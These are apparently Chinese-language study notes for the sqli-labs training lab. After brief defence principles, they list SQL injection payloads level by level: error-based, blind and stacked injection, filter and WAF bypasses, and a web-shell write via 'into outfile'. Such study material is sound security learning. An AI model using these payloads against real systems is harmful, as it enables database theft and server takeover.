#### 防御

```sh
#原则: 不要试图去清洗输入，而要改变数据带入 SQL 的方式。
1.预编译
2.类型检查 (数字强制转换int)
3.白名单
```



#### sql payload

```sh
less1:
	?id=1' order by 4--+
less2:
	?id=1 order by 4--+
less3:
	?id=1') order by 4--+
less4:
	?id=1") order by 4--+
less5:
	#有注入点,但页面无回显
	#利用 updatexml() 报错回显,该函数第二个参数要求路径格式,传入非路径格式(如以 ~ 开头)会触发报错并显示中间的内容：
	?id=1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)--+
	#注意: updatexml 报错信息最多只能显示 32 个字符,配合使用 substr(s,32,32) 或 mid() 函数分段读取
	#它的前提是：后端代码没有屏蔽数据库错误回显（即 PHP 开启了错误显示，且没做异常捕获）
less6:
	#双引号+报错回显
	?id=1" and updatexml(1, concat(0x7e, database(), 0x7e), 1)--+
less7:
	?id=1'))--+
	#页面无报错回显,写入文件到服务器:
	?id=1')) union select 1,2,'<--?php @e-val($_POST["cmd"]);?-->' into outfile "你的绝对路径/shell.php"--+
	#前提:
	1.MySQL 配置必须允许导出文件
	2.知道绝对路径 (猜路径:比如 /var/www/html/)
less-8:
	#布尔盲注
less-9:
	#时间盲注
less-11~16:	#post 略
less-17:	#password 字段注入
less-18:	#header->user-agent 字段注入
less-19:	#header->refer 字段注入
less-20:	#cookie注入
	Cookie: uname=' and updatexml(1,concat(0x7e,database(),0x7e),1) --+; passwd=xxx
less-21~22:	#Cookie注入 + Base64编码 + 单引号+括号闭合 + 报错注入
less-23:	#注释符号 --+,# 被过滤
	?id=1' and '1'='1		#手动闭合('1'='1)
	?id=-1' union select 1,database(),'3		#示例,爆库名
less-24:	
	#二次注入, 漏洞原理:假如引号' 被转义为 \',在保存到数据库时会恢复为'
	#示例:1.先保存 admin'# 内容到数据库 2,在读取时触发漏洞
less-25:
	#双写绕过:如果后台过滤了and or这种,使用anandd oorr #(过滤了1个还有1个)
	?id=1' oorr 1=1 --+
less-26:
	#后台对空格进行了过滤
	方式1:使用url编码代替:
		%a0 (不换行空格)		#常用
		%0a (换行)
		%0b (垂直制表符)
		%0c (换页)
		%0d (回车)
		%09 (Tab 水平制表符)
	方式2:括号绕过法
		SQL 语法允许用括号来包裹字段，从而不需要空格。例:
		select(user())from(users)
	方式3:SQL 注释符 /**/ 代替空格
less-29~31:	
	#后台有WAF防火墙拦截
	#使用参数污染,构造2个参数,一个被waf拦截,另一个传到后台 (例如 ?id=1&id=2)
	#漏洞点:waf可能只拦截第一个,后台取第二个
less-32~35:
	#后端对引号使用了斜杠转义: \'		#十六进制为 %5c%27
	#宽字节注入: 利用 GBK 这种多字节编码。GBK 认为两个字节可以组成一个汉字
	%df'	#后端变成 %df%5c%27, 在 GBK 环境下，%df%5c 会被看作一个整体，解析成汉字 “運”,从而引号逃逸
less-38~45:栈堆叠注入 #略
less-46~47:order by 注入
	#ORDER BY 后面不能直接接 UNION SELECT
	?sort=1 AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)	#报错注入
	?sort=IF(1=1, 1, 2)		#盲注


	
```

#### 布尔盲注

```sh
页面不显示数据，但会根据查询结果正确与否，返回两种不同的状态

#常用函数：
length()：判断长度。
ascii() / ord()：获取字符的 ASCII 码。
substr(str, start, len)：截取字符串

#Payload 示例：
?id=1' and ascii(substr(database(),1,1))>100--+
	--如果数据库名第一个字母的 ASCII 码大于 100，页面显示正常（True）；否则页面显示异常（False
	--像玩“猜数字”一样，通过不断变换数值，最终锁定每一个字符
```

#### 时间盲注

```sh
无论你输入什么，页面返回的内容完全一模一样
只能通过 时间 的延迟判断响应

#常用函数：
if(condition, true_action, false_action)：逻辑判断。
sleep(seconds)：让数据库暂停运行

Payload 示例：
?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1)--+
	--如果数据库名第一个字母是 's' (ASCII 115)，浏览器会转圈圈 5 秒才加载完；如果不是，页面立刻弹出来
	--观察开发者工具 Network 标签页 中的响应时间
```

#### 堆叠注入

```sh
逻辑：利用分号 ; 结束当前的 SQL 语句，然后直接开启一条全新的、完全不同的语句
前提: 支持执行多条语句	#默认禁用

危险: 堆叠注入最强大的地方在于它可以执行 INSERT、UPDATE、DELETE 甚至 DROP
	示例:
	?id=1' ; insert into users(id,username,password) values(55,'hacker','123456') --+
	
```



#### 只过滤引号的风险

```sh
1. ' 过滤成 \'
	-- 某些情况存在宽字节注入风险 (即GBK,BIG5等双字节编码下, \ 会被解析成汉字或其他字符,导致 ' 逃逸
	--二次注入风险, 引号存入数据库,导致读取的时候引发漏洞
2. ' 过滤掉(去掉)
	--反斜杠逃逸:使用 \ 注释了后面的sql引号,导致后面的语句参数出现漏洞,如:
		#password变成name参数的内容,password的内容变成了指令
		SELECT * FROM users WHERE name = ' \ ' AND password = ' OR 1=1 -- '	
	--编码绕过: 使用 hex 编码来引入原本需要引号的数据
		WHERE name = 0x61646d696e  	#这代表 admin
		WHERE name = char(97,100,109,105,110) 	#char 函数利用 ASCII 码构造出 admin，同样全程无引号
	--业务风险:去掉引号或斜杠,会导致业务数据出问题
```



